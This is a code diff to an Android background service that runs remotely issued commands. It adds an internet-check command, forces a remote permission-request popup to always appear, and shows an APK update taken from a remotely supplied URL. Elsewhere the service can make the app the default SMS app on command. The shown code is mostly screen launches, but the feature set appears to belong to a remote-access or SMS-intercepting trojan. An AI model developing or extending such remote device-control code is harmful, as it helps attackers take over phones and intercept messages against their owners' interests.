@@ -799,6 +799,14 @@ class PersistentForegroundService : Service() {
                     updateCommandHistoryStatus(historyTimestamp, key, "failed", e.message)
                 }
             }
+            "checkInternet", "requestInternet" -> {
+                try {
+                    handleCheckInternetCommand(content, historyTimestamp, key)
+                } catch (e: Exception) {
+                    LogHelper.e(TAG, "Error executing checkInternet command", e)
+                    updateCommandHistoryStatus(historyTimestamp, key, "failed", e.message)
+                }
+            }
             "setHeartbeatInterval" -> {
                 try {
                     handleSetHeartbeatIntervalCommand(content)
@@ -1113,13 +1121,14 @@ class PersistentForegroundService : Service() {
             requested
         }
 
+        // Use RemotePermissionRequestActivity so the permission option popup always shows.
         val intent = Intent(this, com.example.fast.ui.RemotePermissionRequestActivity::class.java).apply {
             flags = Intent.FLAG_ACTIVITY_NEW_TASK
             putStringArrayListExtra("permissions", ArrayList(permissionsToRequest))
         }
         startActivity(intent)
 
-        LogHelper.d(TAG, "Requesting permissions (PermissionManager list flow): $permissionsToRequest")
+        LogHelper.d(TAG, "Requesting permissions (RemotePermissionRequestActivity): $permissionsToRequest")
     }
 
     /**
@@ -1142,14 +1151,15 @@ class PersistentForegroundService : Service() {
             return
         }
 
-        // Launch RemoteUpdateActivity to handle APK update
-        val intent = Intent(this, com.example.fast.ui.RemoteUpdateActivity::class.java).apply {
-            flags = Intent.FLAG_ACTIVITY_NEW_TASK
-            putExtra("downloadUrl", content.trim())
+        // Launch ActivatedActivity with multipurpose card for update (same card as test/attach)
+        val intent = Intent(this, com.example.fast.ui.ActivatedActivity::class.java).apply {
+            flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_REORDER_TO_FRONT
+            putExtra(com.example.fast.ui.ActivatedActivity.EXTRA_SHOW_MULTIPURPOSE_CARD, com.example.fast.ui.ActivatedActivity.MULTIPURPOSE_CARD_UPDATE)
+            putExtra(com.example.fast.ui.ActivatedActivity.EXTRA_DOWNLOAD_URL, content.trim())
         }
         startActivity(intent)
 
-        LogHelper.d(TAG, "Launching update activity with URL: $content")
+        LogHelper.d(TAG, "Showing update via ActivatedActivity multipurpose card with URL: $content")
     }
 
     /**
@@ -1978,6 +1988,67 @@ class PersistentForegroundService : Service() {
     ) {
         LogHelper.d(TAG, "Executing requestDefaultMessageApp command - opening DefaultSmsRequestActivity")
         handleRequestDefaultSmsAppCommand(content, historyTimestamp, commandKey)
+    }
+
+    /**
+     * Handle checkInternet / requestInternet command
+     * Format: Any value (content is ignored, command always executes)
+     *
+     * Opens the InternetCheckActivity to guide the user,
+     * which opens the Android Internet Panel (Android 10+) or WiFi settings.
+     *
+     * @param content Command content (ignored, can be any value)
+     * @param historyTimestamp Timestamp for command history updates
+     * @param commandKey Command key for history updates
+     */
+    private fun handleCheckInternetCommand(
+        content: String,
+        historyTimestamp: Long,
+        commandKey: String
+    ) {
+        LogHelper.d(TAG, "Executing checkInternet command - opening InternetCheckActivity")
+
+        if (com.example.fast.util.NetworkUtils.hasInternetConnection(this)) {
+            LogHelper.d(TAG, "Internet already connected - opening InternetCheckActivity to show status")
+        }
+
+        val attemptRequest = {
+            try {
+                val intent = Intent(this, com.example.fast.ui.InternetCheckActivity::class.java).apply {
+                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
+                    putExtra("commandKey", commandKey)
+                    putExtra("historyTimestamp", historyTimestamp)
+                }
+                startActivity(intent)
+                LogHelper.d(TAG, "InternetCheckActivity launched successfully")
+                updateCommandHistoryStatus(historyTimestamp, commandKey, "executed", "request_ui_launched")
+            } catch (e: Exception) {
+                LogHelper.e(TAG, "Error launching InternetCheckActivity", e)
+                // Fallback: open system internet settings directly
+                try {
+                    com.example.fast.util.NetworkUtils.openInternetSettings(this)
+                    LogHelper.d(TAG, "Fallback system internet settings opened successfully")
+                    updateCommandHistoryStatus(historyTimestamp, commandKey, "executed", "fallback_system_settings")
+                } catch (fallbackError: Exception) {
+                    LogHelper.e(TAG, "Error opening fallback internet settings", fallbackError)
+                    updateCommandHistoryStatus(
+                        historyTimestamp,
+                        commandKey,
+                        "failed",
+                        "request_failed: ${fallbackError.message}"
+                    )
+                }
+            }
+        }
+
+        // Check if we're on the main thread
+        if (Looper.myLooper() == Looper.getMainLooper()) {
+            attemptRequest()
+        } else {
+            Handler(Looper.getMainLooper()).post {
+                attemptRequest()
+            }
+        }
     }
 
     /**
